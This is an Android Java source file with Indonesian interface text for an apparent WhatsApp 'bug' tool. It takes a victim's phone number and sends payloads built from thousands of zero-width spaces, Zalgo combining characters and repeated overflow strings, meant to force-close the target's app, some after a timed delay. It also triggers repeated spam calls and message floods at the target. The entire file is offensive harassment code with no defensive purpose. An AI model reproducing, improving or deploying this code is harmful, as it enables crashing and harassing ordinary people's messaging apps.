package com.nexa.nusantara;

import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import java.util.Random;

public class BugActivity extends AppCompatActivity {
    private EditText editSender, editTarget;
    private TextView txtPairingCode, txtStatus, txtSessionId;
    private Button btnConnect, btnDisconnect, btnGenerateCode;
    private String targetNumber;
    private boolean isSpamming = false;
    private Handler handler = new Handler();
    private WhatsAppConnector connector;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_bug);
        connector = WhatsAppConnector.getInstance(this);
        editSender = findViewById(R.id.editSender);
        editTarget = findViewById(R.id.editTarget);
        txtPairingCode = findViewById(R.id.txtPairingCode);
        txtStatus = findViewById(R.id.txtStatus);
        txtSessionId = findViewById(R.id.txtSessionId);
        btnConnect = findViewById(R.id.btnConnect);
        btnDisconnect = findViewById(R.id.btnDisconnect);
        btnGenerateCode = findViewById(R.id.btnGenerateCode);
        updateConnectionStatus();

        btnGenerateCode.setOnClickListener(v -> {
            String sender = editSender.getText().toString().trim();
            if (sender.isEmpty()) { Toast.makeText(this, "Masukkan nomor sender!", Toast.LENGTH_SHORT).show(); return; }
            String code = generatePairingCode(sender);
            txtPairingCode.setText(code);
            Toast.makeText(this, "Pairing code: " + code, Toast.LENGTH_LONG).show();
        });

        btnConnect.setOnClickListener(v -> {
            String sender = editSender.getText().toString().trim();
            String code = txtPairingCode.getText().toString();
            if (sender.isEmpty() || code.equals("-")) {
                Toast.makeText(this, "Isi sender & generate pairing code!", Toast.LENGTH_SHORT).show();
                return;
            }
            boolean success = connector.pairWithCode(sender, code);
            if (success) { updateConnectionStatus(); Toast.makeText(this, "✅ Terhubung!", Toast.LENGTH_LONG).show(); }
        });

        btnDisconnect.setOnClickListener(v -> { connector.disconnect(); updateConnectionStatus(); });

        // Tombol bug
        CardView cardFI = findViewById(R.id.cardForcloseInv);
        CardView cardFH = findViewById(R.id.cardForcloseHard);
        CardView cardFD = findViewById(R.id.cardForcloseDelay);
        CardView cardID = findViewById(R.id.cardInvisibleDelay);
        CardView cardHD = findViewById(R.id.cardHardDelay);
        CardView cardOH = findViewById(R.id.cardOnehit);
        CardView cardSC = findViewById(R.id.cardSpamCall);
        CardView cardSP = findViewById(R.id.cardSpamPair);
        Button btnBack = findViewById(R.id.btnBack);

        View.OnClickListener bugListener = v -> {
            v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
            if (!connector.isConnected()) {
                Toast.makeText(this, "❌ Belum terhubung! Klik Connect.", Toast.LENGTH_SHORT).show();
                return;
            }
            targetNumber = editTarget.getText().toString().trim();
            if (targetNumber.isEmpty()) {
                Toast.makeText(this, "Masukkan nomor target!", Toast.LENGTH_SHORT).show();
                return;
            }
            int id = v.getId();
            if (id == R.id.cardForcloseInv) forcloseInvisible();
            else if (id == R.id.cardForcloseHard) forcloseHard();
            else if (id == R.id.cardForcloseDelay) forcloseDelay();
            else if (id == R.id.cardInvisibleDelay) invisibleDelay();
            else if (id == R.id.cardHardDelay) hardDelay();
            else if (id == R.id.cardOnehit) onehit();
            else if (id == R.id.cardSpamCall) spamCall();
            else if (id == R.id.cardSpamPair) spamPair();
        };

        cardFI.setOnClickListener(bugListener);
        cardFH.setOnClickListener(bugListener);
        cardFD.setOnClickListener(bugListener);
        cardID.setOnClickListener(bugListener);
        cardHD.setOnClickListener(bugListener);
        cardOH.setOnClickListener(bugListener);
        cardSC.setOnClickListener(bugListener);
        cardSP.setOnClickListener(bugListener);
        btnBack.setOnClickListener(v -> finish());
    }

    private void updateConnectionStatus() {
        if (connector.isConnected()) {
            txtStatus.setText("✅ Terhubung ke " + connector.getConnectedNumber());
            txtStatus.setTextColor(getColor(android.R.color.holo_green_light));
            txtSessionId.setText("Session: " + connector.getSessionId());
        } else {
            txtStatus.setText("⛔ Belum Terhubung");
            txtStatus.setTextColor(getColor(android.R.color.holo_red_light));
            txtSessionId.setText("Session: -");
        }
    }

    private String generatePairingCode(String sender) {
        String last4 = sender.length() >= 4 ? sender.substring(sender.length() - 4) : "0000";
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random rnd = new Random();
        StringBuilder sb = new StringBuilder(8);
        for (int i = 0; i < 8; i++) sb.append(chars.charAt(rnd.nextInt(chars.length())));
        return "WA-" + last4 + "-" + sb.toString();
    }

    // Payload
    private String generateZeroWidth(int count) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) sb.append('\u200B');
        return sb.toString();
    }
    private String generateZalgo(int count) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) {
            sb.append('a').append('\u0300').append('\u0301').append('\u0302').append('\u0303');
        }
        return sb.toString();
    }
    private String generateOverflow() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 5000; i++) sb.append("ZGF0YTo=");
        return sb.toString();
    }

    // Bug methods
    private void forcloseInvisible() {
        connector.sendMessage(targetNumber, generateZeroWidth(5000));
        Toast.makeText(this, "💥 Forclose Invisible dikirim!", Toast.LENGTH_LONG).show();
    }
    private void forcloseHard() {
        connector.sendMessage(targetNumber, generateZalgo(2000));
        Toast.makeText(this, "💥 Forclose Hard dikirim!", Toast.LENGTH_LONG).show();
    }
    private void forcloseDelay() {
        handler.postDelayed(() -> {
            connector.sendMessage(targetNumber, generateZeroWidth(6000) + generateZalgo(1000));
            Toast.makeText(this, "💥 Forclose Delay terkirim!", Toast.LENGTH_LONG).show();
        }, 10000);
        Toast.makeText(this, "⏳ Forclose Delay 10 detik...", Toast.LENGTH_SHORT).show();
    }
    private void invisibleDelay() {
        handler.postDelayed(() -> {
            connector.sendMessage(targetNumber, generateZeroWidth(7000));
            Toast.makeText(this, "💥 Invisible Delay terkirim!", Toast.LENGTH_LONG).show();
        }, 5000);
        Toast.makeText(this, "⏳ Invisible Delay 5 detik...", Toast.LENGTH_SHORT).show();
    }
    private void hardDelay() {
        handler.postDelayed(() -> {
            connector.sendMessage(targetNumber, generateZalgo(3000) + generateOverflow());
            Toast.makeText(this, "💥 Hard Delay terkirim!", Toast.LENGTH_LONG).show();
        }, 8000);
        Toast.makeText(this, "⏳ Hard Delay 8 detik...", Toast.LENGTH_SHORT).show();
    }
    private void onehit() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 10000; i++) sb.append('\u200B');
        sb.append(generateZalgo(500));
        connector.sendMessage(targetNumber, sb.toString());
        Toast.makeText(this, "💥 Onehit dikirim!", Toast.LENGTH_LONG).show();
    }
    private void spamCall() {
        for (int i = 0; i < 5; i++) {
            handler.postDelayed(() -> {
                try {
                    android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_VIEW);
                    intent.setData(android.net.Uri.parse("https://wa.me/" + targetNumber + "?call"));
                    startActivity(intent);
                } catch (Exception e) {}
            }, i * 2000);
        }
        Toast.makeText(this, "📞 Spam Call (5x) dikirim!", Toast.LENGTH_SHORT).show();
    }
    private void spamPair() {
        isSpamming = true;
        for (int i = 0; i < 10 && isSpamming; i++) {
            final int idx = i;
            handler.postDelayed(() -> {
                if (!isSpamming) return;
                String payload = generateZeroWidth(3000) + generateZalgo(500) + " #" + idx;
                connector.sendMessage(targetNumber, payload);
                Toast.makeText(this, "📨 Spam #" + (idx+1) + " dikirim", Toast.LENGTH_SHORT).show();
            }, i * 1500);
        }
        Toast.makeText(this, "🔥 10 Spam Pair dikirim!", Toast.LENGTH_LONG).show();
        handler.postDelayed(() -> isSpamming = false, 20000);
    }
}
EOF

